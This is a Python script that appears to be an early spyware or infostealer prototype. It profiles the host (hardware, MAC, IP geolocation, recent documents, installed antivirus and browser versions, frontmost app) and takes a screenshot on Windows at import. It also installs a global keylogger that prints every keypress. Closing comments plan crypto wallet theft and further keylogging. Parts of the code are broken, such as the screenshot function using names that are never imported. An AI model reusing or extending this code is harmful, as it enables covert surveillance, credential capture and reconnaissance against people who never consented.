import psutil
import subprocess
import platform
import subprocess
import re
import os
import socket
import plistlib
import time
import geocoder
import requests
import keyboard
from PIL import Image

sys_os = platform.system()

# conditinal imports
if sys_os == 'Darwin':
    #Mac imports
    import objc
    from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
    from Quartz.CoreGraphics import kCGWindowListOptionIncludingWindow
    from AppKit import NSWorkspace
elif sys_os == 'Linux':
    dist_name = platform.release().lower()
    
    print("Linux flavor: " + dist_name)

elif platform.system() == 'Windows':
    import pyautogui

    # Take screenshot and save it to a file
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')


def get_os_type():
    os_type = platform.system()
    return os_type

def get_memory_size():
    mem = psutil.virtual_memory()
    total_memory = mem.total  # Total physical memory available
    return total_memory

total_memory_bytes = get_memory_size()
total_memory_gb = total_memory_bytes / (1024 ** 3)  # Convert bytes to gigabytes

def get_processor_info():
    try:
        result = subprocess.run(['sysctl', '-n', 'machdep.cpu.brand_string'], stdout=subprocess.PIPE)
        processor_info = result.stdout.decode('utf-8').strip()
        return processor_info
    except Exception as e:
        print(f"Error retrieving processor information: {e}")
        return None

def get_recent_documents():
    if sys_os == 'Darwin':
        # Objective-C imports
        from Foundation import NSUserDefaults

        # Get the shared NSUserDefaults instance
        defaults = NSUserDefaults.standardUserDefaults()

        # Get the recent documents array
        recent_documents = defaults.arrayForKey_("NSRecentDocuments")

        if recent_documents:
            return [str(doc) for doc in recent_documents]
        else:
            return []
    elif sys_os == 'Linux':
        return[]
    
def get_installed_antivirus():
    command = 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s'
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout

        # Search for antivirus software in the registry output
        antivirus_list = re.findall(r"DisplayName\s+REG_SZ\s+(.*)", output)
        
        # Filter antivirus entries
        antivirus_products = [entry.strip() for entry in antivirus_list if "antivirus" in entry.lower()]

        return antivirus_products

    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None
    
def check_xcode_clt_installed():
    try:
        result = subprocess.run(['xcode-select', '--version'], capture_output=True, text=True)
        output = result.stdout.strip()
        if "version" in output.lower():
            return True
        else:
            return False
    except FileNotFoundError:
        return False
    
def get_browser_version(browser_name, app_path):
    info_plist = os.path.join(app_path, 'Contents', 'Info.plist')
    if os.path.exists(info_plist):
        with open(info_plist, 'rb') as f:
            plist_data = plistlib.load(f)
            version = plist_data.get('CFBundleShortVersionString', 'Unknown')
            return version
    return 'Unknown'

def check_installed_browsers():
    browsers = {
        "Safari": "/Applications/Safari.app",
        "Google Chrome": "/Applications/Google Chrome.app",
        "Firefox": "/Applications/Firefox.app",
        "Opera": "/Applications/Opera.app",
        "Microsoft Edge": "/Applications/Microsoft Edge.app"
        # Add more browsers as needed
    }

    installed_browsers = []

    for browser_name, path in browsers.items():
        if os.path.exists(path):
            version = get_browser_version(browser_name, path)
            installed_browsers.append((browser_name, version))

    return installed_browsers

def get_installed_antivirus_mac():
    applications_folder = '/Applications'
    antivirus_apps = []

    for app_name in os.listdir(applications_folder):
        if "antivirus" in app_name.lower():
            antivirus_apps.append(app_name)

    return antivirus_apps

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    return ip_address

def get_ip_location(ip_address):
    g = geocoder.ip(ip_address)
    if g.ok:
        location = g.geojson['features'][0]['properties']['raw']
        return location
    else:
        return "Location not found"


def get_mac_address():
    try:
        # Use subprocess to run ifconfig and capture its output
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        output = result.stdout
        
        # Split the output by lines
        lines = output.splitlines()
        
        # Find the line containing the MAC address (usually under 'en0' or 'en1' interface)
        for line in lines:
            if 'ether ' in line:
                mac_address = line.split('ether ')[1].strip()
                return mac_address
        
        return None  # Return None if MAC address is not found
    except Exception as e:
        print(f"Error: {e}")
        return None

def capture_active_window_screenshot(save_path="screenshot.png"):
    try:
        # Get all windows on the current space (including minimized windows)
        windows = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly | kCGWindowListOptionIncludingWindow, kCGNullWindowID)
        
        # Filter out windows to find the frontmost application window
        for window in windows:
            window_name = window.get('kCGWindowName', '')
            window_owner_name = window.get('kCGWindowOwnerName', '')
            window_layer = window.get('kCGWindowLayer', 0)
            window_bounds = window.get('kCGWindowBounds', {})

            if window_name and window_owner_name and window_layer == 0:
                # Extract window dimensions
                window_x = window_bounds['X']
                window_y = window_bounds['Y']
                window_width = window_bounds['Width']
                window_height = window_bounds['Height']
                
                # Capture the screenshot of the frontmost window
                screenshot = Image.frombytes('RGB', (window_width, window_height), CGWindowListCreateImage(CGRectMake(window_x, window_y, window_width, window_height), kCGWindowListOptionIncludingWindow, kCGNullWindowID, kCGWindowImageDefault))
                
                # Save the screenshot
                screenshot.save(save_path)
                
                print(f"Screenshot saved to {save_path}")
                return

        print("Error: Unable to find frontmost window.")

    except Exception as e:
        print(f"Error capturing screenshot: {e}")

def get_frontmost_application():
    try:
        # Get the shared workspace
        workspace = NSWorkspace.sharedWorkspace()
        
        # Get the frontmost application
        frontmost_app = workspace.frontmostApplication()
        
        if frontmost_app:
            # Print or return information about the frontmost application
            app_name = frontmost_app.localizedName()
            app_pid = frontmost_app.processIdentifier()
            app_bundle_id = frontmost_app.bundleIdentifier()
            app_path = frontmost_app.bundleURL().path()
            
            print(f"Name: {app_name}")
            print(f"PID: {app_pid}")
            print(f"Bundle ID: {app_bundle_id}")
            print(f"Path: {app_path}")
        else:
            print("No frontmost application found.")
    
    except Exception as e:
        print(f"Error: {e}")

def get_external_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        if response.status_code == 200:
            ip = response.json()['origin']
            return ip
        else:
            print(f"Failed to retrieve IP. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error: {e}")
    return None

def on_key_press(event):
    print(f'Key {event.name} was pressed')

os_type = get_os_type()
print(f"Operating System: {os_type}")

processor = get_processor_info()
if processor:
    print(f"Processor: {processor}")
else:
    print("Unable to retrieve processor information.")

print(f"Total Memory: {total_memory_gb:.2f} GB")
print("\n")

mac_address = get_mac_address()
if mac_address:
    print(f"MAC Address: {mac_address}")
else:
    print("Failed to retrieve MAC address.")

ip = get_ip_address()
print(f"IP Address: {ip}")

location = get_ip_location(ip)
print(location)
print("\n")

external_ip = get_external_ip()
if external_ip:
    print(f"The external IP address is: {external_ip}")
else:
    print("Failed to retrieve external IP address.")
external_location = get_ip_location(external_ip)
print(external_location)
print("\n")


recent_docs = get_recent_documents()
if recent_docs:
    print("Recent Documents:")
    for idx, doc in enumerate(recent_docs):
        print(f"{idx + 1}. {doc}")
else:
    print("No recent documents found.")

if sys_os == 'Darwin':
    installed_antivirus = get_installed_antivirus_mac()
    if installed_antivirus:
        print("Installed Antivirus Products:")
        for antivirus in installed_antivirus:
            print(f"- {antivirus}")
    else:
        print("No antivirus products found.")

    if check_xcode_clt_installed():
        print("Xcode Command-Line Tools are installed.")
    else:
        print("Xcode Command-Line Tools are not installed.")

print(f"Operating System: {platform.system()} {platform.release()}")
print(f"Machine Type: {platform.machine()}")
print(f"Processor: {platform.processor()}")
print(f"Python Version: {platform.python_version()}")
print(f"Hostname: {platform.node()}")

installed_browsers = check_installed_browsers()
if installed_browsers:
    print("Installed Browsers:")
    for browser in installed_browsers:
        print(f"- {browser}")
else:
    print("No common browsers found.")

#capture_active_window_screenshot("window_screenshot.png") #:(
get_frontmost_application()

keyboard.on_press(on_key_press)

keyboard.wait('esc')  # Wait for the 'esc' key to exit
#crypto wallet?
#different browsers with version
#keylogger
#IP to physical location
#screenshot
#recently used applications
